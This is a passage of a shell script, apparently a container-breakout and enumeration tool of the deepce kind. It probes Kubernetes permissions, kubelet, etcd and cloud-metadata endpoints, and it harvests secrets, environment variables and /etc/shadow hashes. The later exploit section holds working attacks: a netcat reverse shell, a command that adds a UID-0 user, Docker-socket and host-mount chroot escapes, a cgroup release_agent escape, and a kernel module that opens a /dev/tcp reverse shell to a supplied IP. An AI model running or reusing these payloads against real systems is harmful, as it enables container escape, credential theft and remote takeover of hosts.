    printTip "$TIP_K8S_CREATE_PODS"
  else
    printNo
  fi

  printQuestion "Can exec in pods ........"
  if canI create pods/exec; then
    printYesEx
  else
    printNo
  fi

  printQuestion "Can list secrets ........"
  if canI list secrets; then
    printYesEx
    k8sCanListSecrets="1"
    printTip "$TIP_K8S_SECRETS"
  else
    printNo
  fi

  printQuestion "Can get secrets ........."
  if canI get secrets; then
    printYesEx
  else
    printNo
  fi

  printQuestion "Can list nodes .........."
  if canI list nodes; then
    printYesEx
  else
    printNo
  fi

  printQuestion "Can escalate ClusterRoles"
  _body="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"verb\":\"escalate\",\"resource\":\"clusterroles\",\"group\":\"rbac.authorization.k8s.io\"}}}"
  _resp=$(curl -s $curl_ca --connect-timeout 3 \
    -X POST \
    -H "Authorization: Bearer $tokenData" \
    -H "Content-Type: application/json" \
    -d "$_body" \
    "$k8sAPI/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
  if echo "$_resp" | grep -q '"allowed":true'; then
    printYesEx
    k8sCanEscalate="1"
    printTip "$TIP_K8S_ESCALATE"
  else
    printNo
  fi

  printQuestion "Can bind ClusterRoles ...."
  _body="{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"verb\":\"bind\",\"resource\":\"clusterrolebindings\",\"group\":\"rbac.authorization.k8s.io\"}}}"
  _resp=$(curl -s $curl_ca --connect-timeout 3 \
    -X POST \
    -H "Authorization: Bearer $tokenData" \
    -H "Content-Type: application/json" \
    -d "$_body" \
    "$k8sAPI/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>/dev/null)
  if echo "$_resp" | grep -q '"allowed":true'; then
    printYesEx
    k8sCanBind="1"
  else
    printNo
  fi
}

checkKubeletAPI() {
  printSection "Kubelet API"

  if [ "$noNetwork" ]; then
    return
  fi

  if ! [ -x "$(command -v curl)" ]; then
    printError "curl required for kubelet checks"
    return
  fi

  # Get node IP — try env var, then hostname
  nodeIP="${NODE_IP:-$(hostname -i 2>/dev/null | cut -d' ' -f1)}"
  if ! [ "$nodeIP" ]; then
    printFail "Cannot determine node IP"
    return
  fi

  printQuestion "Kubelet port 10250 ......"
  kubeletResp=$(curl -sk --connect-timeout 3 "https://${nodeIP}:10250/pods" 2>/dev/null | head -c 300)
  if echo "$kubeletResp" | grep -q '"kind"'; then
    printYesEx
    k8sKubeletAnon="1"
    printTip "$TIP_K8S_KUBELET"
    # List pod/namespace combos for exploit targeting
    podList=$(curl -sk --connect-timeout 3 "https://${nodeIP}:10250/pods" 2>/dev/null | \
      grep -o '"name":"[^"]*","namespace":"[^"]*"' | head -10)
    printStatus "Pods on this node:"
    printStatus "$podList"
    k8sKubeletHost="$nodeIP"
  else
    printNo
  fi

  # Port 10255 read-only (legacy, unauth)
  printQuestion "Kubelet port 10255 ......"
  roResp=$(curl -s --connect-timeout 3 "http://${nodeIP}:10255/pods" 2>/dev/null | head -c 100)
  if echo "$roResp" | grep -q '"kind"'; then
    printYesEx
  else
    printNo
  fi
}

checkEtcdExposure() {
  printSection "etcd Exposure"

  if [ "$noNetwork" ]; then
    return
  fi

  if ! [ -x "$(command -v curl)" ]; then
    return
  fi

  etcdHost="${KUBERNETES_SERVICE_HOST:-}"
  if ! [ "$etcdHost" ]; then
    printFail "Cannot determine control plane IP"
    return
  fi

  printQuestion "etcd port 2379 .........."
  # Try etcd v3 health endpoint (no auth)
  etcdResp=$(curl -s --connect-timeout 3 "http://${etcdHost}:2379/health" 2>/dev/null)
  if echo "$etcdResp" | grep -q '"health"'; then
    printYesEx
    printTip "$TIP_K8S_ETCD"
    # Try to list keys
    printStatus "Attempting to list etcd keys..."
    etcdKeys=$(curl -s --connect-timeout 3 \
      -X POST "http://${etcdHost}:2379/v3/kv/range" \
      -H "Content-Type: application/json" \
      -d '{"key":"Cg==","range_end":"Cg==","limit":10}' 2>/dev/null | head -c 500)
    printStatus "$etcdKeys"
  else
    printNo
  fi
}

checkCloudMetadata() {
  printSection "Cloud Metadata Endpoints"

  if [ "$noNetwork" ]; then
    return
  fi

  if ! [ -x "$(command -v curl)" ]; then
    printError "curl required for metadata checks"
    return
  fi

  # AWS EC2 / EKS
  printQuestion "AWS metadata (IMDS) ....."
  awsResp=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>/dev/null | head -c 200)
  if [ "$awsResp" ]; then
    printYesEx
    printTip "$TIP_K8S_METADATA"
    # Try to get IAM role name
    awsRole=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
    if [ "$awsRole" ]; then
      printStatus "IAM role: $awsRole"
      printStatus "Credentials URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/$awsRole"
    fi
    # Try IMDSv2 token
    imdsv2Token=$(curl -s --connect-timeout 3 -X PUT \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
      "http://169.254.169.254/latest/api/token" 2>/dev/null)
    if [ "$imdsv2Token" ]; then
      printStatus "IMDSv2 token obtained — use with X-aws-ec2-metadata-token header"
    fi
  else
    printNo
  fi

  # GCP / GKE
  printQuestion "GCP metadata ............"
  gcpResp=$(curl -s --connect-timeout 3 \
    -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null | head -c 100)
  if [ "$gcpResp" ]; then
    printYesEx
    printTip "$TIP_K8S_METADATA"
    gcpSA=$(curl -s --connect-timeout 3 \
      -H "Metadata-Flavor: Google" \
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null)
    printStatus "GCP service account: $gcpSA"
  else
    printNo
  fi

  # Azure / AKS
  printQuestion "Azure metadata .........."
  azureResp=$(curl -s --connect-timeout 3 \
    -H "Metadata: true" \
    "http://169.254.169.253/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 200)
  if [ "$azureResp" ]; then
    printYesEx
    printTip "$TIP_K8S_METADATA"
    printStatus "$azureResp"
  else
    printNo
  fi
}

checkHostPathMounts() {
  printSection "Kubernetes hostPath Mounts"

  # Sensitive host paths that indicate dangerous mounts
  SENSITIVE_PATHS="/etc /etc/kubernetes /var/lib/kubelet /var/lib/docker /var/run/docker.sock /run/containerd/containerd.sock /proc /sys/fs/cgroup /root /home"

  printQuestion "Sensitive host mounts ...."
  foundSensitive=""
  for p in $SENSITIVE_PATHS; do
    # Check if mountinfo shows this path mounted from host (source outside overlay)
    if grep -q " $p " /proc/self/mountinfo 2>/dev/null; then
      mountSrc=$(grep " $p " /proc/self/mountinfo | head -1 | awk '{print $4}')
      # Overlay and tmpfs are normal container mounts; anything else is suspicious
      if ! echo "$mountSrc" | grep -q "overlay\|tmpfs\|cgroup\|proc\|sysfs"; then
        printEx "  $p -> $mountSrc"
        foundSensitive="1"
      fi
    fi
  done

  if ! [ "$foundSensitive" ]; then
    printNo
  else
    printTip "$TIP_K8S_HOSTPATH"
  fi

  # Check for full root mount
  printQuestion "Root filesystem mounted .."
  if grep -q " / " /proc/self/mountinfo 2>/dev/null; then
    rootMountSrc=$(grep " / " /proc/self/mountinfo | grep -v "overlay\|tmpfs" | head -1 | awk '{print $4}')
    if [ "$rootMountSrc" ] && [ "$rootMountSrc" != "/" ]; then
      printYesEx
      printStatus "Host root at: $rootMountSrc"
    else
      printNo
    fi
  else
    printNo
  fi

  # Runtime socket mounts (allows container escape)
  printQuestion "Runtime socket mounted .."
  if grep -q "docker.sock\|containerd.sock\|crio.sock" /proc/self/mountinfo 2>/dev/null; then
    printYesEx
    printTip "$TIP_WRITABLE_SOCK"
  else
    printNo
  fi
}

checkK8sSecrets() {
  printSection "Kubernetes Secrets"

  if ! [ -x "$(command -v curl)" ]; then
    return
  fi

  saToken="${k8sToken:-$SA_TOKEN_PATH}"
  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
    return
  fi

  if ! [ "$k8sAPI" ]; then
    if [ "$KUBERNETES_SERVICE_HOST" ]; then
      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
    else
      return
    fi
  fi

  tokenData=$(cat "$saToken")
  ns="${k8sNamespace:-default}"

  printQuestion "Secrets in namespace ...."
  # shellcheck disable=SC2086
  secretResp=$(curl -s $curl_ca --connect-timeout 3 \
    -H "Authorization: Bearer $tokenData" \
    "$k8sAPI/api/v1/namespaces/$ns/secrets" 2>/dev/null)
  secretCount=$(echo "$secretResp" | grep -o '"name"' | wc -l)
  if [ "$secretCount" -gt 0 ] 2>/dev/null; then
    printSuccess "$secretCount secrets found in namespace $ns"
    # List secret names and types
    secretNames=$(echo "$secretResp" | grep -o '"name":"[^"]*' | cut -d'"' -f4 | head -20)
    printStatus "$secretNames"
    # Flag interesting types
    if echo "$secretResp" | grep -q "kubernetes.io/dockerconfigjson\|Opaque\|kubernetes.io/tls"; then
      printStatus "Interesting secret types detected (image pull secrets / TLS / opaque)"
    fi
  else
    printNo
  fi

  # Try cluster-wide if have permissions
  printQuestion "Cluster-wide secrets ...."
  # shellcheck disable=SC2086
  clusterSecretResp=$(curl -s $curl_ca --connect-timeout 3 \
    -H "Authorization: Bearer $tokenData" \
    "$k8sAPI/api/v1/secrets" 2>/dev/null)
  clusterSecretCount=$(echo "$clusterSecretResp" | grep -o '"name"' | wc -l)
  if [ "$clusterSecretCount" -gt 0 ] 2>/dev/null; then
    printYesEx
    printSuccess "$clusterSecretCount secrets cluster-wide"
  else
    printNo
  fi
}

checkK8sNodeInfo() {
  printSection "Kubernetes Node Info"

  if ! [ -x "$(command -v curl)" ]; then
    return
  fi

  saToken="${k8sToken:-$SA_TOKEN_PATH}"
  if ! [ "$k8sAPI" ]; then
    if [ "$KUBERNETES_SERVICE_HOST" ]; then
      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
    else
      return
    fi
  fi

  tokenData=""
  if [ -f "$saToken" ] && [ -r "$saToken" ]; then
    tokenData=$(cat "$saToken")
  fi

  printQuestion "Node list ..............."
  # shellcheck disable=SC2086
  nodeResp=$(curl -s $curl_ca --connect-timeout 3 \
    -H "Authorization: Bearer $tokenData" \
    "$k8sAPI/api/v1/nodes" 2>/dev/null)
  nodeCount=$(echo "$nodeResp" | grep -o '"kind":"Node"' | wc -l)
  if [ "$nodeCount" -gt 0 ] 2>/dev/null; then
    printSuccess "$nodeCount nodes"
    nodeIPs=$(echo "$nodeResp" | grep -o '"address":"[0-9.]*' | cut -d'"' -f4 | sort -u)
    printStatus "Node IPs: $nodeIPs"
  else
    printNo
  fi

  printQuestion "Namespaces ..............."
  # shellcheck disable=SC2086
  nsResp=$(curl -s $curl_ca --connect-timeout 3 \
    -H "Authorization: Bearer $tokenData" \
    "$k8sAPI/api/v1/namespaces" 2>/dev/null)
  nsNames=$(echo "$nsResp" | grep -o '"name":"[^"]*' | cut -d'"' -f4 | grep -v "^$" | head -20)
  if [ "$nsNames" ]; then
    printYes
    printStatus "$nsNames"
  else
    printNo
  fi
}

enumerateKubernetes() {
  printSection "Enumerating Kubernetes"

  # Initialize shared state
  curl_ca="-k"
  k8sAPI=""
  k8sNamespace="default"
  k8sCanCreatePods=""
  k8sCanListSecrets=""
  k8sCanEscalate=""
  k8sCanBind=""
  k8sKubeletAnon=""
  k8sKubeletHost=""

  checkServiceAccount
  checkK8sAPIServer
  checkK8sRBAC
  checkHostPathMounts
  checkKubeletAPI
  checkEtcdExposure
  if [ "$k8sCheckMetadata" ]; then
    checkCloudMetadata
  fi
  checkK8sSecrets
  checkK8sNodeInfo
}

enumerateContainers() {
  printSection "Enumerating Containers"

  if [ "$inContainer" ]; then # If inside a container

    printTip "$TIP_NETWORK_ENUM"

    # Find containers...
    if [ "$dockerCommand" ]; then
        # Enumerate containers using docker
        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
        printMsg "Docker Containers........" "$dockercontainers"
        docker ps -a
    elif [ "$dockerSockPath" ]; then
        # Enumerate containers using sock
        TODO "Enumerate container using sock"
    else
        pingSweep
    fi

    portScan

  else # Not in a container

    if docker ps >/dev/null 2>&1; then # Enumerate docker containers
        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
        dockercontainersTotal=$(docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
        printMsg "Docker Containers........" "$dockercontainers Running, $dockercontainersTotal Total"
        docker ps -a
    fi
    if lxc list >/dev/null 2>&1; then # Enumerate lxc containers
        lxccontainers=$(lxc list | grep -c "| RUNNING |" 2>/dev/null)
        lxccontainersTotal=$(lxc list | grep -c "| CONTAINER |" 2>/dev/null)
        printMsg "LXC Containers..........." "$lxccontainers Running, $lxccontainersTotal Total"
        lxc list
    fi
    if rkt list >/dev/null 2>&1; then # Enumerate rkt containers
        rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)
        printMsg "RKT Containers..........." "$rktcontainers Total" # TODO: Test and add total
        rkt list
    fi
  fi
}

pingSweep() {
  if [ "$noNetwork" ]; then
    return
  fi

  if [ "$containerIP" ]; then
    # Enumerate containers the hard way (network enumeration)
    subnet=$(echo "$containerIP" | cut -d'.' -f1-3)

    if [ -x "$(command -v nmap)" ]; then
      # Method 1: nmap
      printQuestion "Attempting ping sweep of $subnet.0/24 (nmap)"
      nl
      nmap -oG - -sP "$subnet.0/24" | grep "Host:"
    elif [ -x "$(command -v ping)" ] && ping -c 1 127.0.0.1 2>/dev/null 1>&2; then
      # Method 2: ping sweep (check ping is executable, and we can run it, sometimes needs root)
      printQuestion "Attempting ping sweep of $containerIP/24 (ping)"
      nl

      pids=""
      # Ping all IPs in range
      set +m
      for addr in $(seq 1 1 10); do
        (ping -c 1 -t 1 "$subnet.$addr" >/dev/null && echo "$subnet.$addr" is Up) & true >/dev/null
        pids="${pids} $!"
      done

      # Wait for all background pids to complete
      for pid in ${pids}; do
        wait "${pid}"
      done
    else
      printError "Could not ping sweep, requires nmap or ping to be executable"
    fi
  else
    printError "Cannot enumerate network without IP address"
  fi
}

portScan() {
  if [ "$noNetwork" ]; then
    return
  fi

  # Scan containers / host
  if [ -x "$(command -v nmap)" ]; then
    # Method 1: nmap
    if [ "$containerIP" ]; then
      printSection "Scanning Host"
      printQuestion "Scanning host $hostIP (nmap)"
      nmap "$hostIP" -p-
    fi
  fi
}

findMountedFolders() {
  # Find information about mount points
  printSection "Enumerating Mounts"

  printQuestion "Docker sock mounted ......."
  if grep -q docker.sock /proc/self/mountinfo; then
    printYesEx
    # Docker sock appears to be mounted, uhoh!
    printTip "$TIP_WRITABLE_SOCK"
    dockerSockPath=$(grep "docker.sock" /proc/self/mountinfo | cut -d' ' -f 5)
  else
    printNo
  fi

  otherMounts=$(grep -v "$GREP_IGNORE_MOUNTS" /proc/self/mountinfo | cut -d' ' -f 4-)

  printQuestion "Other mounts .............."
  if [ "$otherMounts" ]; then
    printYes
    printStatus "$otherMounts"

    # Possible host usernames found: (sed is hard... using a fudge)
    usernames=$(echo "$otherMounts" | sed 's/.*\/home\/\(.*\)/\1/' | cut -d '/' -f 1 | sort | uniq | tr '\n' ' ')
    if [ "$usernames" ]; then
      printResult "Possible host usernames ..." "$usernames"
    fi

    if echo "$otherMounts" | grep -q "ecryptfs"; then
      printResult "Encrypted home directory .." "Detected"
    fi

  else
    printNo
  fi
}

findInterestingFiles() {
  printSection "Interesting Files"

  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Ii "$GREP_SECRETS")
  boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Iiv "$GREP_SECRETS")

  printQuestion "Interesting environment variables ..."
  if [ "$interestingVars" ]; then
    printYes
    printSuccess "$interestingVars"
  else
    printNo
  fi

  printStatus "$boringVars"

  # Any common entrypoint files etc?
  entrypoint=$(ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null)
  printResultLong "Any common entrypoint files ........." "$entrypoint"

  # Any files in root dir
  if [ -x "$(command -v find)" ]; then
    interestingFiles=$(find / -maxdepth 1 -type f | grep -v "/.dockerenv\|deepce.sh")
  else
    # shellcheck disable=SC2010
    interestingFiles=$(ls -lah / | grep -v '^d\|^l\|^total\|.dockerenv\|deepce.sh')
  fi

  printResultLong "Interesting files in root ..........." "$interestingFiles"

  # Any secrets in root dir files
  result=$(grep -Iins --exclude="deepce.sh" "$GREP_SECRETS" /*)

  printResultLong "Passwords in common files ..........." "$result"

  # Home Directories
  homeDirs="$(ls -lAh /home)"
  printQuestion "Home directories ...................."

  if echo "$homeDirs" | grep -qv 'total 0'; then
    printStatus "$homeDirs"
  else
    printNo
  fi

  printQuestion "Hashes in shadow file ..............."
  if test -r /etc/shadow; then
    hashes=$(cut -d':' -f2 < /etc/shadow 2>/dev/null | grep -v '^*$\|^!')
    if [ "$hashes" ]; then
      printYes
      printStatus "$hashes"
    else
      printNo
    fi
  else
    printFail "Not readable"
  fi

  # TODO: Check this file /run/secrets/

  printQuestion "Searching for app dirs .............."
  nl
  for p in ${PATH_APPS}; do
    if [ -f "$p" ]; then
      printSuccess "$p"
      printMsg "$(ls -lAh "$p")"
    fi
  done
}

checkDockerRootless() {
  printQuestion "Rootless ................"
  if docker info 2>/dev/null|grep -q rootless; then
    printYes
    printTip "$TIP_DOCKER_ROOTLESS"
  else
    printNo
  fi
}

getDockerVersion() {
  printQuestion "Docker Executable ......."
  if [ "$(command -v docker)" ]; then
    dockerCommand="$(command -v docker)"
    dockerVersion="$(docker -v | cut -d',' -f1 | cut -d' ' -f3)"

    printSuccess "$dockerCommand"
    printQuestion "Docker version .........."
    printSuccess "$dockerVersion"

    checkDockerRootless

    printQuestion "User in Docker group ...."
    if groups | grep -q '\bdocker\b'; then
      printYesEx
      printTip "$TIP_DOCKER_GROUP"
    else
      printNo
    fi
  else
    printFail "Not Found"
  fi
}

checkDockerVersionExploits() {
  # Check version for known exploits
  printResult "Docker Version .........." "$dockerVersion" "Version Unknown"
  if ! [ "$dockerVersion" ]; then
    return
  fi

  printQuestion "CVE-2019-13139 .........."
  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.5)" ]; then
    printYesEx
    printTip "$TIP_CVE_2019_13139"
  else
    printNo
  fi

  printQuestion "CVE-2019-5736 ..........."
  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.3)" ]; then
    printYesEx
    printTip "$TIP_CVE_2019_5736"
  else
    printNo
  fi

  # Leaky Vessels: BuildKit CVEs fixed in Docker 25.0.2
  printQuestion "CVE-2024-23651/52/53 ...."
  if [ "$(ver "$dockerVersion")" -lt "$(ver 25.0.2)" ]; then
    printYesEx
    printTip "$TIP_CVE_2024_23651"
    printTip "$TIP_CVE_2024_23652"
    printTip "$TIP_CVE_2024_23653"
  else
    printNo
  fi
}

checkRuncVersionExploits() {
  getRuncVersion
  printResult "runc Version ............" "$runcVersion" "Version Unknown"
  if ! [ "$runcVersion" ]; then
    return
  fi

  # Leaky Vessels: runc FD leak — fixed in 1.1.12
  printQuestion "CVE-2024-21626 .........."
  if [ "$(ver "$runcVersion")" -lt "$(ver 1.1.12)" ]; then
    printYesEx
    printTip "$TIP_CVE_2024_21626"
    # Live FD leak probe: check if any /proc/self/fd entry resolves outside container root
    fdLeak=$(ls -la /proc/self/fd 2>/dev/null | grep -v "pipe:\|socket:\|/proc\|/dev" | grep "/" | head -3)
    if [ "$fdLeak" ]; then
      printStatus "Possible host FD references detected:"
      printStatus "$fdLeak"
    fi
  else
    printNo
  fi

  # November 2025 runc trio — fixed in 1.2.8
  printQuestion "CVE-2025-31133/52565/52881"
  if [ "$(ver "$runcVersion")" -lt "$(ver 1.2.8)" ]; then
    printYesEx
    printTip "$TIP_CVE_2025_31133"
    printTip "$TIP_CVE_2025_52565"
    printTip "$TIP_CVE_2025_52881"
  else
    printNo
  fi
}

checkKernelVersionExploits() {
  kernelFull=$(uname -r)
  # Extract major.minor.patch for comparison
  kernelShort=$(echo "$kernelFull" | grep -o '^[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*')
  printResult "Kernel Version .........." "$kernelFull" "Unknown"
  if ! [ "$kernelShort" ]; then
    return
  fi

  # CVE-2024-1086: netfilter UAF — patched in 5.15.149, 6.1.76, 6.6.15, 6.7.3
  kernelMajorMinor=$(echo "$kernelFull" | grep -o '^[0-9][0-9]*\.[0-9][0-9]*' | tr -d '.')
  printQuestion "CVE-2024-1086 ..........."
  vulnerable1086="0"
  case "$kernelMajorMinor" in
    515) [ "$(ver "$kernelShort")" -lt "$(ver 5.15.149)" ] && vulnerable1086="1" ;;
    61)  [ "$(ver "$kernelShort")" -lt "$(ver 6.1.76)" ]  && vulnerable1086="1" ;;
    66)  [ "$(ver "$kernelShort")" -lt "$(ver 6.6.15)" ]  && vulnerable1086="1" ;;
    67)  [ "$(ver "$kernelShort")" -lt "$(ver 6.7.3)" ]   && vulnerable1086="1" ;;
  esac
  if [ "$vulnerable1086" = "1" ]; then
    printYesEx
    printTip "$TIP_CVE_2024_1086"
  else
    printNo
  fi
}

###########################################
#--------------) Exploits (---------------#
###########################################

prepareExploit() {
  # Shared method that takes the user input and converts it into a cmd to be used for exploitation
  # Current available PAYLOADS are:
  # - shadow
  # - local shell
  # - custom command
  # - new root user

  printMsg "Preparing Exploit" " "

  if [ "$shadow" ]; then

    # Show shadow password hashes
    printMsg "Exploit Type ............." "Print Shadow"
    printMsg "Clean up ................." "Automatic on container exit"

    cmd="cat /etc/shadow"

  elif [ "$username" ]; then
    # New root user

    if ! [ "$username" ]; then
      printError "username missing"
      exit 1
    fi

    if ! [ "$password" ]; then
      printError "password missing"
      exit 1
    fi

    printMsg "Exploit Type ............." "Add new root user"
    printMsg "Username ................." "$username"
    printMsg "Password ................." "$password"
    printMsg "Clean up ................." "Manual, remember to delete user after exploitation!"
    # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
    cmd="useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username"

  elif [ "$command" ]; then

    # Custom payload (run a command)
    printMsg "Exploit Type ............." "Custom Command"
    printMsg "Custom Command ..........." "$command"
    printMsg "Clean up ................." "Automatic on container exit"
    cmd="$command"

  elif [ "$ip" ]; then
    # Reverse shell

    if ! [ "$port" ]; then
      printError "port missing"
      exit 1
    fi

    printMsg "Shell Type ....... " "Reverse TCP"
    printMsg "Create listener .. " "No"
    printMsg "Host ............. " "$ip"
    printMsg "Port ............. " "$port"
    cmd="/bin/sh -c nc $ip $port -e /bin/sh"

    if [ "$listen" ]; then
      # Enable job control
      set -m
      # Create listener
      nc -lvnp "$port" &
      # PID_NC=$!
      bg
    fi

  else
    # TODO: Disable on sock / privileged as we dont have interactive
    printMsg "Exploit Type ............." "Local Shell"
    printMsg "Create shell ............." "Yes"
    printMsg "Clean up ................." "Automatic on container exit"
    cmd="/bin/sh"
  fi

  if ! [ "$cmd" ]; then
    printError "Nothing to do, if trying to launch a shell add -cmd bash"
    exit 1
  fi
}

exploitDocker() {
  printSection "Exploiting Docker"
  printTip "$TIP_DOCKER_CMD"

  if ! [ -x "$(command -v docker)" ]; then
    printError "Docker command not found, but required for this exploit"
    exit
  fi

  checkDockerRootless

  prepareExploit
  printQuestion "Exploiting"
  nl
  # shellcheck disable=SC2086 # Word splitting is expected and allowed here
  docker run -v /:/mnt --rm -it alpine chroot /mnt $cmd

  printQuestion "Exploit complete ...."
  if [ $? ]; then
    printSuccess "Success"
  else
    printError 'Error'
  fi
}

exploitPrivileged() {

# This is disabled because if no-enum is set then we dont know if we're in a container..
#  if ! [ "$inContainer" ]; then
#    printError "Not in container"
#    return
#  fi

  printSection "Exploiting Privileged"
  printTip "$TIP_PRIVILEGED_MODE"
  prepareExploit

  # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
  # shellcheck disable=SC2012 # Not using find as it may not be available
  d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")
  if [ -S "$d" ]; then
    printError "Error: exploit failed (docker too old?)"
    return
  fi
  mkdir -p "$d/w"
  echo 1 >"$d/w/notify_on_release"
  t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
  touch /o
  echo "$t/c" >"$d/release_agent"
  printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t">/c
  chmod +x /c
  sh -c "echo 0 >$d/w/cgroup.procs"
  sleep 1
  cat /o
  rm /c /o
}

exploitDockerSock() {
  printSection "Exploiting Sock"
  printTip "$TIP_DOCKER_SOCK"

  if ! [ -x "$(command -v curl)" ]; then
    printInstallAdvice "curl"
    exit
  fi

  if ! [ -S "$dockerSockPath" ]; then
    printError "Docker sock not found, but required for this exploit"
    exit
  fi

  prepareExploit

  nl

  # Try to find an available docker image
  json_data=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json)
  docker_img=$(echo "$json_data" | grep -o '"RepoTags":\["[^"]*' | grep -o '[^"]*$' | tail -1)

  if [ -z "$docker_img" ]; then
    printInfo 'No avaliable docker image found, using alpine'
    docker_img="alpine" 
  fi 

  # Create docker container using the docker sock
  payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"$docker_img\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)

  if ! [ $? ]; then
    printError 'Something went wrong'
    echo "$response"
    return
  fi

  revShellContainerID=$(echo "$response" | cut -d'"' -f4)
  printQuestion "Creating container ....."
  printSuccess "$revShellContainerID"

  startCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start"
  logsCmd="curl -s --unix-socket /var/run/docker.sock \"http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1\" --output -"
  deleteCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/stop"
  removeCmd="curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID"

  printQuestion "If the shell dies you can restart your listener and run the start command to fire it again"
  nl
  printStatus "Start Command: $startCmd"
  printStatus "Logs Command: $logsCmd"

  printQuestion "Once complete remember to tidy up by stopping and removing your container with following commands"
  nl

  printStatus "Stop Command: $deleteCmd"
  printStatus "Remove Command: $removeCmd"

  # FIXME: Must be a better way of doing this...
  response=$(eval "$startCmd")

  printQuestion "Starting container ....."
  if [ $? ]; then
    printSuccess "Success"
  else
    printError 'Something went wrong...'
  fi

  delay=2

  printMsg "Sleeping for ..........." "${delay}s"

  sleep $delay

  response=$(eval "$logsCmd")

  printQuestion "Fetching logs .........."
  if [ $? ]; then
    printSuccess "Success"
    printStatus "$response"
  else
    printError 'Something went wrong...'
  fi

  printQuestion "Exploit completed ....."
  if [ "$listen" ]; then
    # Create listener
    printSuccess 'Switching to listener'
    fg
  else
    printSuccess ':)'
  fi

  # TODO: Switch to listener if wanted
  # TODO: Tidy up command
}

exploitSysModule(){
  printSection "Exploiting SYS_MODULE"
  printTip "$TIP_SYS_MODULE"

  if ! [ -x "$(command -v capsh)" ]; then
    printError "capsh is required to run this exploit."
    exit 1
  fi

  if ! [ -x "$(command -v make)" ]; then
    printError "make is required to run this exploit."
    exit 1
  fi

  if ! [ -x "$(command -v insmod)" ]; then
    printError "insmod is required to run this exploit."
    exit 1
  fi

  if ! [ -d "/lib/modules/$(uname -r)" ]; then
    printError "Linux headers for $(uname -r) are required to run this exploit."
    exit 1
  fi

  caps=$(capsh --print)
  if ! echo "$caps" | grep -qa "cap_sys_module" ; then
    printError "We don't have the SYS_MODULE capability, which is required for this exploit"
    exit 1
  fi

  if [ -z "$ip" ]; then
    printError "Missing reverse shell IP : use --ip"
    exit 1
  fi

  if [ -z "$port" ]; then
    printError "Missing reverse shell port : use --port"
    exit 1
  fi
  
  module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
  sys_cwd=$(pwd)

  mkdir /dev/shm/rev && cd /dev/shm/rev || exit 1

  printQuestion "Writing scripts..."

  # POC modified from https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
cat << EOF > "$module_name.c"
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/$ip/$port 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init ${module_name}_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit ${module_name}_exit(void) {
}
module_init(${module_name}_init);
module_exit(${module_name}_exit);
EOF

cat << EOF > Makefile
obj-m +=${module_name}.o
all:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
clean:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
EOF

  printSuccess "Done"

  printQuestion "Compiling kernel module..."

  if make 1>/dev/null ; then
    printSuccess "Done"
  else
    printError "Failed to make. Do you have all the required libraries installed?"
    exit 1
  fi

  printQuestion "Mounting kernel module..."

  if insmod "$module_name.ko" 1>/dev/null ; then
    printSuccess "Done"
  else
    printError "Failed to mount module"
    exit 1
  fi

  printQuestion "Cleaning up..."

  rm -r /dev/shm/rev

  cd "$sys_cwd" || exit

  printSuccess "Done"

